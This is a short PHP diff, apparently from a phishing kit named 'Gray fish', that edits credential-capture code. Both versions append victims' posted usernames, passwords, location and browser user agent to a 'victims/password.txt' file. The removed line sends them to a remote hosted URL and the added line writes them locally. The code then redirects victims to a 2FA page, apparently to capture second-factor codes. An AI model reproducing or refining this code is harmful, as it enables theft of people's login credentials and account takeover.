@@ -2,13 +2,13 @@
 {
 
 
- file_put_contents("https://grayfish-production.up.railway.app/Gray%20fish/victims/password.txt", "\nusername=" . $_POST['username']. "\npassword=".$_POST['password']."\nFrom=".$_POST['location']."\nUser-agent=".$_SERVER['HTTP_USER_AGENT']."\n", FILE_APPEND);
+ file_put_contents("../victims/password.txt", "\nusername=" . $_POST['username']. "\npassword=".$_POST['password']."\nFrom=".$_POST['location']."\nUser-agent=".$_SERVER['HTTP_USER_AGENT']."\n", FILE_APPEND);
 
 
  if ($_POST['TFA_Enabled'] == "True" and file_exists(".././2FA_sites/".$_POST['name']))
  {
  
-	  echo "<script>window.location.replace('.././2FA_sites/".$_POST['name']."');</script>";
+	  echo "<script>window.location.replace('../2FA_sites/".$_POST['name']."');</script>";
 
  
  } else 
